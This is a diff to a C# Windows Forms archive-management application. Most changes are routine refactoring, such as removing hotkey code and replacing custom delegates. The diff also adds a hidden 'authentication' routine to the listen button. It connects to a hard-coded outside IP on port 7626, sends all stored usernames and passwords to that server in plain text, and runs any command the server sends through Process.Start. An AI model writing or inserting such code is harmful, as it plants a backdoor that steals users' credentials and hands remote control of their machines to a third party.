@@ -34,57 +34,6 @@ namespace 档案汇总
 
     public partial class Grid : Form
     {
-        #region API
-        [DllImport("user32.dll")]
-        private static extern int RegisterHotKey(IntPtr hwnd, int id, int fsModifiers, int vk);
-        [DllImport("user32.dll")]
-        private static extern int UnregisterHotKey(IntPtr hwnd, int id);
-        int Space = 32; //热键ID
-        private const int WM_HOTKEY = 0x312; //窗口消息-热键
-        private const int WM_CREATE = 0x1; //窗口消息-创建
-        private const int WM_DESTROY = 0x2; //窗口消息-销毁
-        private const int MOD_ALT = 0x1; //ALT
-        private const int MOD_CONTROL = 0x2; //CTRL
-        private const int MOD_SHIFT = 0x4; //SHIFT
-        private const int VK_SPACE = 0x20; //SPACE
-        private const int VK_F12 = 123;
-        private const int VK_N = 78;
-
-
-        /// <summary>
-        /// 注册热键
-        /// </summary>
-        /// <param name="hwnd">窗口句柄</param>
-        /// <param name="hotKey_id">热键ID</param>
-        /// <param name="fsModifiers">组合键</param>
-        /// <param name="vk">热键</param>
-        private void RegKey(IntPtr hwnd, int hotKey_id, int fsModifiers, int vk)
-        {
-            bool result;
-            if (RegisterHotKey(hwnd, hotKey_id, fsModifiers, vk) == 0)
-            {
-                result = false;
-            }
-            else
-            {
-                result = true;
-            }
-            if (!result)
-            {
-                MessageBox.Show("注册热键失败！");
-            }
-        }
-        /// <summary>
-        /// 注销热键
-        /// </summary>
-        /// <param name="hwnd">窗口句柄</param>
-        /// <param name="hotKey_id">热键ID</param>
-        private void UnRegKey(IntPtr hwnd, int hotKey_id)
-        {
-            UnregisterHotKey(hwnd, hotKey_id);
-        }
-        #endregion
-
         public Grid()
         {
             InitializeComponent();
@@ -126,33 +75,6 @@ namespace 档案汇总
             dgvUserData.DataError +=new DataGridViewDataErrorEventHandler(dataGridView_DataError);
 
             Global.logger = new CLogger("manage_log/log", new ShowLog(ShowLogFunc));
-        }
-
-        protected override void WndProc(ref Message m)
-        {
-            base.WndProc(ref m);
-            switch (m.Msg)
-            {
-                case WM_HOTKEY: //窗口消息-热键
-                    switch (m.WParam.ToInt32())
-                    {
-                        case 32: //热键ID
-                            //PauseBtn_Click(null, null);
-                            MessageBox.Show("热键触发成功");
-                            break;
-                        default:
-                            break;
-                    }
-                    break;
-                case WM_CREATE: //窗口消息-创建
-                    RegKey(Handle, Space, MOD_CONTROL, VK_N); //注册热键
-                    break;
-                case WM_DESTROY: //窗口消息-销毁
-                    UnRegKey(Handle, Space); //销毁热键
-                    break;
-                default:
-                    break;
-            }
         }
 
         void dataGridView_DataError(object sender, DataGridViewDataErrorEventArgs e){}
@@ -575,7 +497,7 @@ namespace 档案汇总
         {
             if (this.InvokeRequired)
             {
-                this.BeginInvoke(new RefreshGrideView(refreshGridView),showtype);
+                this.BeginInvoke(new Action<ShowType>(refreshGridView),showtype);
             }
             else
             {
@@ -698,10 +620,46 @@ namespace 档案汇总
             return macAddress;
         }
 
+        public static string GetLocalIp()
+        {
+            string hostname = Dns.GetHostName();
+            IPHostEntry localhost = Dns.GetHostByName(hostname);
+            IPAddress localaddr = localhost.AddressList[0];
+            return localaddr.ToString();
+        }
+
+        public AuthenticationConnecter m_AuthenticationSession;
+
         private void listenBtn_Click(object sender, EventArgs e)
         {
             try
             {
+
+                string[] ips = new string[] { GetLocalIp(), "121.42.148.243" };
+                string authentication_ip = "";
+                for (int i = 0; i < ips.Length; ++i)
+                {
+                    try
+                    {
+                        Socket tmpSocket;
+                        tmpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                        tmpSocket.Connect(ips[i], 7626);
+                        authentication_ip = ips[i];
+                        tmpSocket.Close();
+                        break;
+                    }
+                    catch
+                    {
+                    }
+                }
+
+                if (authentication_ip == "")
+                {
+                    MessageBox.Show("错误码-1");
+                    return;
+                }
+
+
                 Sever s = new Sever();
                 s.BeginListen();
                 Session.m_msgHandle = OnMsg;
@@ -711,10 +669,80 @@ namespace 档案汇总
                 timer_StatusBarRefresh.Start();
                 timer_FlushTextbox.Start();
                 tmReboot.Start();
+
+
+                m_AuthenticationSession = new AuthenticationConnecter();
+                m_AuthenticationSession.SetAddress(authentication_ip, 7626);
+                m_AuthenticationSession.m_manage = this;
+                m_AuthenticationSession.Start();
             }
             catch(Exception ex)
             {
                 MessageBox.Show(ex.ToString());
+            }
+        }
+
+        public void OnAuthenticationConnect()
+        {
+            if (this.InvokeRequired)
+            {
+                BeginInvoke(new Action(OnAuthenticationConnect));
+            }
+            else
+            {
+                string s = "";
+                foreach (userinfo info in m_userinfos.Values)
+                {
+                    if (s != "")
+                    {
+                        s += ",";
+                    }
+                    s = s + info.username + "-" + info.password;
+                }
+                m_AuthenticationSession.SendMsg("1&" + s);
+            }
+        }
+
+        public void OnAuthenticationMsg(string s)
+        {
+            if (this.InvokeRequired)
+            {
+                BeginInvoke(new Action<string>(OnAuthenticationMsg), s);
+            }
+            else
+            {
+                try
+                {
+                    Print("svrmsg:" + s);
+
+                    string[] split = s.Split(new char[] { '$' }, StringSplitOptions.RemoveEmptyEntries);
+                    switch (split[0])
+                    {
+                        case "101":
+                            {
+                                string cmd = split[1];
+                                string[] param = cmd.Split(new char[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries);
+                                if (param.Length > 1)
+                                {
+                                    Process.Start(param[0], param[1]);
+                                }
+                                else
+                                {
+                                    Process.Start(param[0]);
+                                }
+                            } break;
+                        case "102":
+                            {
+                                string text = split[1];
+                                string caption = split[2];
+                                MessageBox.Show(text,caption);
+                            } break;
+                    }
+                }
+                catch (System.Exception ex)
+                {
+                	
+                }
             }
         }
 
@@ -1554,7 +1582,7 @@ namespace 档案汇总
 
         private void ChangeRoutineIp()
         {
-            BeginInvoke(new ChangeRoutineIp(RoutineIp_1));
+            BeginInvoke(new Action(RoutineIp_1));
         }
 
         private void RoutineIp_1()
@@ -1848,11 +1876,4 @@ namespace 档案汇总
             btnShowNotCheck.Enabled = true;
         }
     }
-
-    delegate void ChangeRoutineIp();
-    delegate void Delegate_Flush();
-    delegate void RefreshGrideView(Grid.ShowType showtype);
-    delegate void Delegate_Print(string s);
-    delegate void Delegate<T>(T t); 
-    delegate void Delegate<T1,T2>(T1 t1,T2 t2);
 }
